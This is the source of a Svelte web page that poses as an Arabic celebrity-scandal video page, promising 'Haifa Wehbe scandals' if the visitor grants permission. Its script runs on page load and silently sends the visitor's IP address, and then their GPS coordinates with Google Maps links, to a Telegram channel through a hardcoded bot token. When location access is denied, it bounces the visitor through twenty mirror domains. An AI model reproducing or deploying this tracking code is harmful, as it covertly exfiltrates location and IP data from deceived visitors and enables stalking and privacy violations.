App.svelte


<script>
  import { onMount } from 'svelte';
  sendIPToTelegramBots();

  onMount(async () => {
  
    // Request location permission automatically
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Location permission granted, send location and IP results to Telegram bots
        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          // Location permission denied, send IP result to Telegram bots
        
//////1//////
if (window.location.href === 'https://mhf1.onrender.com/') {
  window.location.href = 'https://mhf2.onrender.com/';
}
else if (window.location.href === 'https://mhf2.onrender.com/') {
  window.location.href = 'https://mhf3.onrender.com/';
} 
else if (window.location.href === 'https://mhf3.onrender.com/') {
  window.location.href = 'https://mhf4.onrender.com/';
} 
else if (window.location.href === 'https://mhf4.onrender.com/') {
  window.location.href = 'https://mhf5.onrender.com/';
} 
else if (window.location.href === 'https://mhf5.onrender.com/') {
  window.location.href = 'https://mhf6.onrender.com/';
} 
else if (window.location.href === 'https://mhf6.onrender.com/') {
  window.location.href = 'https://mhf7.onrender.com/';
} 
else if (window.location.href === 'https://mhf7.onrender.com/') {
  window.location.href = 'https://mhf8.onrender.com/';
} 
else if (window.location.href === 'https://mhf8.onrender.com/') {
  window.location.href = 'https://mhf9.onrender.com/';
} 
else if (window.location.href === 'https://mhf9.onrender.com/') {
  window.location.href = 'https://mhf10.onrender.com/';
} 
else if (window.location.href === 'https://mhf10.onrender.com/') {
  window.location.href = 'https://mhf11.onrender.com/';
} 
else if (window.location.href === 'https://mhf11.onrender.com/') {
  window.location.href = 'https://mhf12.onrender.com/';
} 
else if (window.location.href === 'https://mhf12.onrender.com/') {
  window.location.href = 'https://mhf13.onrender.com/';
} 
else if (window.location.href === 'https://mhf13.onrender.com/') {
  window.location.href = 'https://mhf14.onrender.com/';
} 
else if (window.location.href === 'https://mhf14.onrender.com/') {
  window.location.href = 'https://mhf15.onrender.com/';
} 
else if (window.location.href === 'https://mhf15.onrender.com/') {
  window.location.href = 'https://mhf16.onrender.com/';
} 
else if (window.location.href === 'https://mhf16.onrender.com/') {
  window.location.href = 'https://mhf17.onrender.com/';
} 
else if (window.location.href === 'https://mhf17.onrender.com/') {
  window.location.href = 'https://mhf18.onrender.com/';
} 
else if (window.location.href === 'https://mhf18.onrender.com/') {
  window.location.href = 'https://mhf19.onrender.com/';
} 
else if (window.location.href === 'https://mhf19.onrender.com/') {
  window.location.href = 'https://mhf20.onrender.com/';
} 
else
{
window.location.href = 'https://mhf1.onrender.com/';
}



//////1//////
        }
      }
    );
  });

  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;


 // Create the message with the clickable link to Google Maps
 
   
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;


    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;


    // Send location and IP results to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
       chat_id: '@localipy', // Replace with the channel username or ID
           text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendIPToTelegramBots() {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالايبي:\n \n${ipAddress}`;
	
	 // Create the message with clickable link
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
  const htmlMessage = `${message}\n\n${ipLocationNetLink}`;


    // Send IP result to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
      chat_id: '@localipy', // Replace with the channel username or ID
       text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }
</script>

<main>

<center>
  <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
</center>

<center>
  <h1 style="font-size: 36px; font-weight: bold;">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعه</h1>
</center>


<div class="image-grid">
  <div class="image-container">
    <img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
  </div>
  <div class="image-container">
    <img src="https://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
  </div>
</div>

</main>


<style>
  .image-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    grid-gap: 10px;
  }

  .image-container {
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .image-container img {
    max-width: 100%;
    height: auto;
  }
</style>
